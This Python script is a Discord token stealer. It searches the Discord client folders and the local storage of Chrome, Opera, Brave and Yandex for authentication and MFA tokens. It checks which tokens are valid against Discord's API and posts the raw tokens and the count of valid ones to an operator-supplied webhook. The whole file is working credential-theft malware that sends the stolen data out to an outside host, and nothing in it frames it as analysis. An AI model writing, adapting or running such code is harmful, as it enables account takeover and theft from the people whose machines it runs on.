import os
from typing import List
import requests
import re
import json

from urllib.request import Request, urlopen

def find_tokens(path):
    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

def is_token_valid(token: str) -> bool:
    headers = {'Authorization': token}

    try:
        r = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
        return r.status_code == 200
    except:
        return False

        
def check_tokens(paths: dict) -> List[str]:
    valid_tokens = []

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        tokens = find_tokens(path)

        for token in tokens:
            if is_token_valid(token):
                valid_tokens.append(token)

    return valid_tokens


def send_message_to_webhook(message: str, webhook_url: str) -> None:
    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }
    
    payload = json.dumps({'content': message})

    try:
        response = requests.post(webhook_url, data=payload, headers=headers)
        response.raise_for_status()
    except requests.exceptions.HTTPError as e:
        print(f'An error occurred while sending the message to the webhook: {e}')
    except requests.exceptions.RequestException as e:
        print(f'An error occurred while making the request to the webhook: {e}')


def main():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    webhook_url = input("Enter your webhook URL: ")

    message = ''

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message += f'\n**{platform}**\n```\n'

        if platform == 'Discord':
            tokens = []

            # Grab token from the Discord config file
            try:
                with open(path + '\\Local Storage\\leveldb\\000005.ldb', 'rb') as f:
                    for line in f.readlines():
                        for token in re.findall(rb'[A-Za-z0-9_]{24}\.[A-Za-z0-9_]{6}\.[A-Za-z0-9_]{27}', line):
                            tokens.append(token.decode())
            except FileNotFoundError:
                pass

        else:
            tokens = find_tokens(path)

        if len(tokens) > 0:
            for token in tokens:
                message += f'{token}\n'
        else:
            message += 'No tokens found.\n'

        message += '```'

    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }

    payload = json.dumps({'content': message})

    try:
        req = Request(webhook_url, data=payload.encode(), headers=headers)
        urlopen(req)
    except:
        pass
    valid_tokens = check_tokens(paths)

    message = f'Total valid tokens found: {len(valid_tokens)}'

    send_message_to_webhook(message, webhook_url)

if __name__ == '__main__':
    main()
